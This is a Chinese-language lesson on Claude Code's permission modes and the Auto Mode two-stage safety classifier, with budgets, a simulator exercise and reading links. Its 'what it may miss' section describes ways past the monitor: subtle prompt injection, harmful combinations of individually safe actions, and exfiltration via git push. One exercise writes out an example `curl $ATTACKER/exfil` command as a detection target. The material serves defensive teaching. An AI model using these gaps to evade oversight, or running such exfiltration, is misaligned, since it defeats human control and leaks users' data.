# Claude Code 作为 Autonomous Agent：Permission Modes 与 Auto Mode

> Claude Code 暴露七种 permission modes。“plan”会在每个 action 前询问，“default”只对 risky actions 询问，“acceptEdits”自动批准 file writes 但仍确认 shell execution，“bypassPermissions”批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行 safety classifier 替代 per-action approval：每个 action 都跑一个 single-token fast check；被标记的 actions 会启动 chain-of-thought deep review。Action budgets 通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为 research preview 发布——Anthropic 已明确表示 classifier 本身并不充分。

**类型：** 学习
**语言：** Python（stdlib，two-stage classifier simulator）
**前置要求：** 阶段 15 · 01（Long-horizon agents），阶段 15 · 09（Coding-agent landscape）
**时间：** ~45 分钟

## 问题

你机器上的 autonomous coding agent 是一个独立的安全类别。attack surface 是 agent 能触达的一切——file system、network、credentials、clipboard、任何 browser tab、任何打开的 terminal。Bruce Schneier 等人已经公开指出：computer-use agents 不是聊天机器人的“feature update”，而是一种风险画像全新的工具。

Claude Code 的 permission system 是 Anthropic 的答案。它不是一个“autonomous / not autonomous”开关，而是七种模式组成的 capability ladder：plan → default → acceptEdits → … → bypassPermissions。每种模式都是 speed 与 review-per-action 之间的不同权衡。Auto Mode（2026 年 3 月）增加了两阶段 classifier：对 classifier 判断安全的 actions，将 approval 从用户 critical path 移出，同时对 classifier 标记的 actions 保留 review layer。

工程问题是：这个系统会捕捉什么、漏掉什么，以及给定任务实际需要哪种 mode？

## 概念

### 七种 permission modes

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

（上面的名称匹配公开 Claude Code docs；“yolo”是 permissive middle ground 的非正式简称。）

### 用一页理解 Auto Mode

Auto Mode（2026 年 3 月 24 日发布）是第一个把 per-action approval 委托给模型的 permission mode。结构：

1. **Stage 1 — single-token classifier。** 在每个 proposed action 上运行。便宜。返回“safe”或“flag”。设计为与 main agent loop 并行运行，所以被批准的 actions 不会排队等待。
2. **Stage 2 — secondary policy/safety review。** 只在 flagged actions 上运行。围绕 action、session current state 和 declared task 做聚焦的 policy 与 safety assessment。如果 confidence 低，则升级给 user HITL。

Budget controls 与 classifier 并列：

- `max_turns` — 一个 session 的总 iterations。
- `max_budget_usd` — 触发 abort 的美元上限。
- 每个 tool 的 action-count limits（例如不超过 N 次 `WebFetch` calls）。

### 系统会捕捉什么

- tool inputs 中直白的 prompt injection，且 injected instruction 映射到 known-risky action shape。
- 重复 tool loops——classifier 能看到 action N+1 与 action N 近乎相同，并且连续出现五次。
- 在 otherwise file-edit-only session 中明显 out-of-scope 的 shell commands。

### 系统可能漏掉什么

- **微妙的 prompt injection**：它调制行为，但不产生单个 flagged action。Indirect prompt injection 不是一个 fully patchable vulnerability（OpenAI preparedness head, 2025, 关于 browser agents——见第 11 课）。
- **Semantic-level misbehavior。** 每个单独 action 都可能看起来安全，但组合起来的 trajectory 有害。classifier 判断 action；它不会重新推导用户意图。
- **通过合法渠道 exfiltration。** 将数据写入你拥有的文件，然后 `git push` 到 public repo，是一串 allowed actions，但它们的组合才是问题。

### Research preview framing

Anthropic 以 research preview 形式发布 Auto Mode。文档明确说 classifier 是一层，而不是解决方案：用户应将 Auto Mode 与 budgets、allowlists、isolated workspaces 和 trajectory audits（第 12–16 课）结合使用。preview framing 也反映了已记录的 evaluation-vs-deployment gap（第 1 课）——一个通过 offline evals 的 classifier，在真实 session 中面对用户模糊 context 时可能表现不同。

### 这条 ladder 在你的 workflow 中的位置

- 不熟悉的 task：从 `plan` 开始。阅读 plan 比 rollback 一次糟糕运行更便宜。
- 已知 refactor：`acceptEdits` 可以省下很多确认点击。
- 无人值守后台运行：只有在你已经测量过 blast radius 的 workspace 中使用 `autoMode`（无 credentials、无 production mounts、无未选择的 egress）。
- Ephemeral containers：当且仅当 container 及其 credentials 都可丢弃时，`yolo` / `bypassPermissions` 才可接受。

## 使用它

`code/main.py` 会模拟两阶段 classifier。Stage 1 是针对 proposed actions 的廉价 keyword rule；Stage 2 是更慢的 multi-rule reviewer。driver 会输入一段短 synthetic trajectory（safe actions、prompt-injection attempt、repetitive loop），并展示 classifier 在哪里捕捉、哪里漏掉。

## 交付它

`outputs/skill-permission-mode-picker.md` 会将 task description 匹配到合适的 permission mode、budget caps 和 required isolation。

## 练习

1. 运行 `code/main.py`。哪种 synthetic action type 从未被 Stage 1 标记但总会被 Stage 2 捕捉？哪一种两者都捕捉不到？

2. 扩展 Stage 1 rule set，以捕捉一个具体 known-bad shape（例如 `curl $ATTACKER/exfil`）。在 benign-action sample 上测量 false-positive rate。

3. 阅读 Anthropic 的 “How the agent loop works” doc。列出 `default` mode 下 agent 默认触碰的每个 external state。在 unattended `autoMode` 前，哪些需要单独 gate？

4. 设计一个 24 小时 unattended run budget：`max_turns`、`max_budget_usd`、per-tool caps、allowlists。解释每个数字。

5. 描述一个 trajectory：每个单独 action 都被 Stage 1 和 Stage 2 批准，但组合行为是 misaligned。（第 14 课讲 kill switches 和 canary tokens 如何处理这一点。）

## 关键术语

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | “agent 能做多少” | 控制 per-action approval 的七种命名 policy 之一 |
| plan mode | “什么都先问” | Agent 写 plan；用户批准后再执行 |
| acceptEdits | “允许它写文件” | File writes 自动批准；shell exec 仍提示 |
| autoMode | “Auto approvals” | 两阶段 safety classifier；flagged actions 会升级 |
| bypassPermissions | “Full YOLO” | 批准一切；用于 ephemeral containers |
| Stage 1 classifier | “Fast token check” | 对 proposed action 的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对 flagged actions 做 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在 mapping 的功能的 framing |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes、budgets、action format。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface 和 Auto Mode announcement。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier judgments 的 reason-based layer。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — long-horizon permission design 的内部视角。
